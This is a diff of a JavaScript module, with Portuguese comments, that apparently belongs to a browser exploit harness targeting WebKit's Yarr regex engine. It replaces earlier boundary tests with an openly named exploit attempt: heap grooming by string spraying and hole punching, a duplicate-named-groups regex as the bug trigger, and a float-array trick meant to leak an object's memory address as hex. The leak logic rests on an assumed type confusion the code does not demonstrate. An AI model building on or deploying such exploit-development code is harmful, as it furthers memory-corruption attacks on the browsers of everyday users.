@@ -2,73 +2,88 @@ import { Groomer } from '../mod_groomer.js';
 
 export default {
     id:       'REGEXP_GROUP_INTEGER_OVERFLOW',
-    category: 'Boundary',
-    risk:     'HIGH',
+    category: 'Exploit',
+    risk:     'CRITICAL',
     description:
-        'Ataques ao parser/compilador Yarr sem causar ReDoS. ' +
-        'O JSString Heap é fragmentado antes da compilação para forçar ' +
-        'o compilador a usar rotas lentas de memória (causando o transbordo de 16-bits).',
+        'Caça à Primitiva AddrOf: Focamos no crash dos Grupos Nomeados Duplicados. ' +
+        'Tentamos ler a estrutura corrompida do objeto retornado sem usar conversões ' +
+        'de string (que causam o TypeError). O objetivo é extrair o ponteiro (0x...).',
 
     setup: function() {
         this.results = {};
         this.regexps = {};
+        
+        // A ARMADILHA: Um array nativo de números decimais (Float64).
+        // Se conseguirmos empurrar o objeto corrompido para aqui dentro,
+        // o C++ pode confundir o endereço do objeto com um número decimal.
+        this.addrofArray = [1.1, 2.2, 3.3, 4.4]; 
     },
 
     trigger: function() {
-
-        // 🚨 Grooming Massivo do JSString Heap:
-        // Poluímos a memória com strings pequenas e criamos buracos.
-        // O motor Yarr será forçado a tentar alocar o seu array num ambiente caótico.
+        // 1. Grooming Massivo: Fragmentamos o Heap de Strings
         let stringTrash = Groomer.sprayStrings(64, 5000);
         Groomer.punchHoles(stringTrash, 3);
 
-        // A: Muitos grupos de captura (limite de 16-bits no Yarr antigo)
         try {
-            const groups = '(a)'.repeat(0x10000); // 65536 grupos
-            this.regexps.manyGroups = new RegExp(groups);
-            this.results.manyGroupsExec = this.regexps.manyGroups.exec('a')?.length;
-        } catch(e) { this.results.manyGroupsErr = e.constructor.name; }
-
-        // B: Backreference além do limite de grupos
-        try {
-            this.regexps.deepBackref = new RegExp('(a)\\65536');
-            this.results.deepBackrefExec = this.regexps.deepBackref.exec('a')?.length;
-        } catch(e) { this.results.deepBackrefErr = e.constructor.name; }
-
-        // C: Quantifier com valores near UINT32_MAX
-        try {
-            this.regexps.bigQuant = new RegExp('a{0,65535}');
-            this.results.bigQuantExec = this.regexps.bigQuant.exec('')?.length;
-        } catch(e) { this.results.bigQuantErr = e.constructor.name; }
-
-        // D: Alternation com muitos branches 
-        try {
-            const alts = Array.from({ length: 1000 }, (_, i) => `alt${i}`).join('|');
-            this.regexps.deepAlt = new RegExp(alts);
-            this.results.deepAltExec = this.regexps.deepAlt.exec('alt999') ? 'matched' : 'nomatch';
-        } catch(e) { this.results.deepAltErr = e.constructor.name; }
-
-        // E: Grupos nomeados duplicados 
-        try {
+            // 2. A Compilação Maliciosa (Gatilho do Bug)
             this.regexps.dupNamed = new RegExp('(?<name>a)|(?<name>b)');
-            this.results.dupNamedExec = this.regexps.dupNamed.exec('a')?.groups;
-        } catch(e) { this.results.dupNamedErr = e.constructor.name; }
+            
+            // 3. Capturamos o Objeto sem aceder a ".groups"
+            this.results.rawExec = this.regexps.dupNamed.exec('a');
+            
+            // 4. A TENTATIVA DE ADDROF
+            // Empurramos o objeto mutante para o array numérico. 
+            // Se o Type Confusion nativo ocorrer, o índice 0 não guardará 
+            // o objeto em si, mas sim o seu ponteiro de memória C++.
+            this.addrofArray[0] = this.results.rawExec;
+            
+        } catch(e) { 
+            this.results.error = e.constructor.name; 
+        }
     },
 
     probe: [
-        s => s.results.manyGroupsExec   ?? s.results.manyGroupsErr,
-        s => s.results.deepBackrefExec  ?? s.results.deepBackrefErr,
-        s => s.results.bigQuantExec     ?? s.results.bigQuantErr,
-        s => s.results.deepAltExec      ?? s.results.deepAltErr,
-        s => s.results.dupNamedExec     ?? s.results.dupNamedErr,
-
-        // Acesso ao índice máximo da memória possivelmente corrompida
-        s => { try { return s.regexps.manyGroups?.exec('a')?.[0xFFFF]; } catch(e) { return e.constructor.name; } },
-        s => { try { return s.regexps.dupNamed?.exec('b')?.groups?.name; } catch(e) { return e.constructor.name; } },
+        // Probe 0: O objeto foi criado? (typeof protege contra o TypeError)
+        s => typeof s.results.rawExec,
+        
+        // Probe 1: O motor ainda consegue ler a estrutura básica do objeto?
+        s => {
+            try {
+                if (!s.results.rawExec) return 'null';
+                return Object.keys(s.results.rawExec).length + ' chaves legíveis';
+            } catch(e) {
+                return 'Objeto Ilegível (Corrupção Brutal)';
+            }
+        },
+        
+        // Probe 2: A LEITURA DO PONTEIRO (ADDR OF)
+        s => {
+            try {
+                let val = s.addrofArray[0];
+                
+                // Se o valor for um 'number', significa que o Type Confusion resultou
+                // e o motor WebKit leu o endereço do objeto como se fosse um Double!
+                if (typeof val === 'number' && val !== 1.1) {
+                    
+                    // Lógica de conversão Float64 -> Hexadecimal (Ponteiro de Memória)
+                    const buf = new ArrayBuffer(8);
+                    new Float64Array(buf)[0] = val;
+                    const ptr = new BigUint64Array(buf)[0];
+                    
+                    const hexPtr = `0x${ptr.toString(16).padStart(16, '0')}`;
+                    return `💥 SUCESSO AddrOf: ${hexPtr}`;
+                }
+                
+                return 'Ainda é tratado como objeto';
+            } catch(e) {
+                return `Erro no AddrOf: ${e.message}`;
+            }
+        }
     ],
 
     cleanup: function() {
         this.results = {};
         this.regexps = {};
+        this.addrofArray = null;
     }
 };
